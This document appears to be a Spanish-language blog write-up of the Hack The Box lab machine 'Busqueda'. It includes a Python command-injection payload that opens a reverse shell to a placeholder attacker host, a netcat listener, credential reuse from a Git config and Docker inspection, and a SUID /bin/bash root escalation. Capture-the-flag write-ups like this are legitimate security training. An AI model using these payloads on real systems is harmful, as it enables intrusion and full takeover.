---
layout: single
title: Busqueda - Hack The Box
excerpt: "Busqueda es una máquina Linux de dificultad fácil que implica explotar una vulnerabilidad de inyección de comandos presente en un módulo de Python. Al aprovechar esta vulnerabilidad, obtenemos acceso a nivel de usuario a la máquina. A escalar privilegios a root, descubrimos credenciales dentro de un archivo de configuración de Git, lo que nos permite iniciar sesión en un local Servicio de gitea. Además, descubrimos que se puede ejecutar un script de verificación del sistema con privilegios de root. por un usuario específico. Al utilizar este script, enumeramos los contenedores Docker que revelan las credenciales para el
cuenta Gitea del usuario administrador. Análisis adicional del código fuente del script de verificación del sistema en un El repositorio de Git revela un medio para explotar una referencia de ruta relativa, lo que nos permite la ejecución remota de código (RCE) con privilegios de root."
date: 2023-08-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-busqueda/busqueda_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
 
tags:  
  - burpsuite
  - Command Injection
  - python
  - RCE
  
---

![](/assets/images/htb-writeup-busqueda/busqueda_logo.png)

Busqueda es una máquina Linux de dificultad fácil que implica explotar una vulnerabilidad de inyección de comandos presente en un módulo de Python. Al aprovechar esta vulnerabilidad, obtenemos acceso a nivel de usuario a la máquina. A escalar privilegios a root, descubrimos credenciales dentro de un archivo de configuración de Git, lo que nos permite iniciar sesión en un local Servicio de gitea. Además, descubrimos que se puede ejecutar un script de verificación del sistema con privilegios de root. por un usuario específico. Al utilizar este script, enumeramos los contenedores Docker que revelan las credenciales para el
cuenta Gitea del usuario administrador. Análisis adicional del código fuente del script de verificación del sistema en un El repositorio de Git revela un medio para explotar una referencia de ruta relativa, lo que nos permite la ejecución remota de código (RCE) con privilegios de root.

# 1. Enumeración
   
Iniciamos con un escaneando de puertos de la máquina con Nmap.

## Portscan
Encontramos dos puertos abiertos. 
•	22 de SSH 
•	80 de HTTP

![](/assets/images/htb-writeup-busqueda/portscan.png)

Realizamos un “Curl” para obtener información adicional.

![](/assets/images/htb-writeup-busqueda/curl.png)

Agregamos el dominio encontrado en el archivo “/etc/hosts” para que sepa a donde resolver cuando apuntemos a él.

![](/assets/images/htb-writeup-busqueda/hosts.png)

## Website
Navegamos hasta el servicio web. Encontramos que es una aplicación que se utiliza para realizar búsquedas con diferentes buscadores.

•	https://github.com/ArjunSharda/Searchor.

![](/assets/images/htb-writeup-busqueda/web.png)

## Burp Suite
Vamos a realizar una búsqueda cualquiera e interceptamos la petición con BurpSuite.

![](/assets/images/htb-writeup-busqueda/burp.png)

# 2. Explotación

Realizamos la busqueda de posible exploit para el buscardor "searchor".

•	Exploit: https://github.com/jonnyzar/POC-Searchor-2.4.2

Debemos inyectar una carga en la peticion interceptada por Burp.

Carga Util:

•	', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('IP-ATACANTE',PORT-ATACANTE));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#

Interceptamos la petición con BurpSuite y agregamos nuestra carga útil.

![](/assets/images/htb-writeup-busqueda/burp2.png)

Paralelamente debemos ponernos en escucha por el puerto donde vamos a recivbir nuestra conexión (4444) y enviamos la petición desde Burp Suit.
•	nc -nlvp 444
Luego de enviar la peicion, vamos a recibir nuestra shell de la maquina, ahora generamos una terminal ( tty) mas facil de maenjar a través de Python y capturamos nuestra flag de usuario estandar.

![](/assets/images/htb-writeup-busqueda/rever.png)

## 3. Escalación de Privilegios

Listamos el directorio /var/www/app y encontramos “.git”.

![](/assets/images/htb-writeup-busqueda/list.png)

Nos dirigimos al directorio encontrado y volvemos a listar. Ahora encontramos un archivo de configuración.

![](/assets/images/htb-writeup-busqueda/config.png)

Leemos el archivo y encontramos un usuario y una contraseña asociado a un acceso a un dominio.

![](/assets/images/htb-writeup-busqueda/config2.png)

Nos conectamos por ssh con esas credenciales.

![](/assets/images/htb-writeup-busqueda/ssh.png)

Reutilizamos la contraseña para saber que permisos SUDO tiene el usuario “svc”.

![](/assets/images/htb-writeup-busqueda/sudo.png)

No podemos leer el archivo, pero podemos ver algunos de los parámetros permitidos.

•	sudo /usr/bin/python3 /opt/scripts/system-checkup.py *

![](/assets/images/htb-writeup-busqueda/sudo2.png)

![](/assets/images/htb-writeup-busqueda/sudo3.png)

•	Enlace: https://docs.docker.com/engine/reference/commandline/inspect/

•	sudo python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db

![](/assets/images/htb-writeup-busqueda/sudo4.png)


Credenciales:

•	yuiu1hoiu4i5ho1uh

•	jI86kGUuj87guWr3RyF



#!/bin/bash 
chmod +s /bin/bash
cat full-checkup.sh
chmod +x full-checkup.sh


![](/assets/images/htb-writeup-busqueda/sudo5.png)

•	sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

•	ls -l /bin/bash

•	bash -p

Luego de cambiar a usuario root, capturamos nuestra flag.

•	whoami

•	cat /root/root.txt

![](/assets/images/htb-writeup-busqueda/sudo6.png)
